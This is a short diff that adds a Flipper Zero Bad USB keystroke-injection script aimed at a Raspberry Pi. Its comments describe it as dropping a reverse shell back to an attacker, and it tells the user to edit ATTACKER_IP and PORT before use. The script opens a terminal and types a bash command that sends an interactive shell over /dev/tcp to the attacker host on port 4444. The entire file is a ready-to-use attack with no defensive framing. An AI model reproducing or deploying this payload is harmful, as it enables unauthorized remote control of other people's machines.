@@ -1,0 +1,9 @@
+REM Flipper Zero Bad USB — drop a reverse shell back to attacker machine
+REM Edit ATTACKER_IP and PORT before use.
+REM Target: Raspberry Pi
+
+DELAY 1000
+CTRL ALT t
+DELAY 1000
+STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
+ENTER
